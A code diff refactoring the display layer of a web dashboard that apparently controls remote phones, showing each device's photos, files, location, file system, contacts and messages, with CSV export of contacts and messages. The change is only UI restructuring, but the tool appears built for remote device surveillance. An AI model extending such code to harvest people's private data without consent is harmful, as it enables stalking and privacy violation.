@@ -378,13 +378,18 @@ let ws = null, wsUrl = '', selId = null;
 const devs = {}, cache = {};
 const isMob = () => window.innerWidth <= 640;
 
-// Panel IDs — only one visible at a time
-const PANEL_IDS = ['fm-card','contacts-card','msg-card'];
-
-function removeOtherPanels(keepId) {
-  PANEL_IDS.forEach(id => {
-    if (id !== keepId) document.getElementById(id)?.remove();
-  });
+// Single active panel — only one result visible at a time
+function getPanel() {
+  const r = document.getElementById('results');
+  let p = document.getElementById('active-panel');
+  if (!p) {
+    p = document.createElement('div');
+    p.id = 'active-panel';
+    p.className = 'ri';
+    r.innerHTML = '';
+    r.appendChild(p);
+  }
+  return p;
 }
 
 // ── Boot
@@ -537,33 +542,19 @@ function doSms() {
 // ── Result helpers
 function ts() { return new Date().toLocaleTimeString([], {hour:'2-digit',minute:'2-digit'}); }
 
-function addResult(tag, html, cardId) {
-  const r = document.getElementById('results');
-  if (cardId) {
-    removeOtherPanels(cardId);
-    const existing = document.getElementById(cardId);
-    if (existing) {
-      existing.querySelector('.rb').innerHTML = html;
-      existing.querySelector('.rtime').textContent = ts();
-      existing.scrollIntoView({ behavior:'smooth', block:'nearest' });
-      return;
-    }
-  }
-  const div = document.createElement('div');
-  div.className = 'ri';
-  if (cardId) div.id = cardId;
-  div.innerHTML = `<div class="rh"><span class="rt">${tag}</span><span class="rtime">${ts()}</span></div><div class="rb">${html}</div>`;
-  r.prepend(div);
-  while (r.children.length > 30) r.removeChild(r.lastChild);
+function showPanel(tag, html) {
+  const p = getPanel();
+  p.innerHTML = `<div class="rh"><span class="rt">${tag}</span><span class="rtime">${ts()}</span></div><div class="rb">${html}</div>`;
+  p.scrollIntoView({ behavior:'smooth', block:'nearest' });
 }
 
 function addText(t, tag='📋 Response') {
-  addResult(tag, `<pre>${x(t)}</pre>`);
+  showPanel(tag, `<pre>${x(t)}</pre>`);
 }
 
 function addPhoto(m) {
   const src = 'data:image/jpeg;base64,' + m.fileData;
-  addResult('📷 Photo', `<img src="${src}"><br><a href="${src}" download="${x(m.fileName||'photo.jpg')}" class="dl-link">⬇ Save Photo</a>`);
+  showPanel('📷 Photo', `<img src="${src}"><br><a href="${src}" download="${x(m.fileName||'photo.jpg')}" class="dl-link">⬇ Save Photo</a>`);
 }
 
 function addFile(m) {
@@ -571,15 +562,15 @@ function addFile(m) {
   for (let i=0;i<b.length;i++) a[i]=b.charCodeAt(i);
   const url = URL.createObjectURL(new Blob([a]));
   const sz = fmtSz(m.fileSize||a.length);
-  addResult('📎 File', `<a href="${url}" download="${x(m.fileName||'file')}" class="dl-link">⬇ ${x(m.fileName||'file')} <small style="opacity:.7">(${sz})</small></a>`);
+  showPanel('📎 File', `<a href="${url}" download="${x(m.fileName||'file')}" class="dl-link">⬇ ${x(m.fileName||'file')} <small style="opacity:.7">(${sz})</small></a>`);
 }
 
 function addLoc(m) {
   const url = `https://www.google.com/maps?q=${m.lat},${m.lng}`;
-  addResult('📍 Location', `<div class="loc-pre">${m.caption?x(m.caption):''}</div><a href="${url}" target="_blank" class="map-link">🗺 Open in Google Maps</a>`);
+  showPanel('📍 Location', `<div class="loc-pre">${m.caption?x(m.caption):''}</div><a href="${url}" target="_blank" class="map-link">🗺 Open in Google Maps</a>`);
 }
 
-// ── File Manager (reuses fm-card, removes contacts/msg panels)
+// ── File Manager
 function addFm(m) {
   const path = m.path||'/';
   const items = m.items||[];
@@ -603,14 +594,13 @@ function addFm(m) {
     });
     h += '</div>';
   }
-  addResult('📁 File Manager', h, 'fm-card');
+  showPanel('📁 File Manager', h);
 }
 
-// ── Contacts (reuses contacts-card, removes msg/fm panels)
+// ── Contacts
 function showContacts(list) {
   window._allC = list;
-  const h = buildContactsHtml(list, list);
-  addResult('📋 Contacts', h, 'contacts-card');
+  showPanel('📋 Contacts', buildContactsHtml(list, list));
   requestAnimationFrame(() => {
     document.getElementById('dl-c')?.addEventListener('click', () => dlContacts(list));
     document.getElementById('ref-c')?.addEventListener('click', () => {
@@ -668,11 +658,10 @@ function dlContacts(list) {
   dl(csv, 'text/csv', `contacts_${selId}_${Date.now()}.csv`);
 }
 
-// ── Messages (reuses msg-card, removes contacts/fm panels)
+// ── Messages
 function showMessages(list) {
   window._allM = list;
-  const h = buildMsgHtml(list, list);
-  addResult('📨 Messages', h, 'msg-card');
+  showPanel('📨 Messages', buildMsgHtml(list, list));
   requestAnimationFrame(() => {
     document.getElementById('dl-m')?.addEventListener('click', () => dlMessages(list));
     document.getElementById('ref-m')?.addEventListener('click', () => {
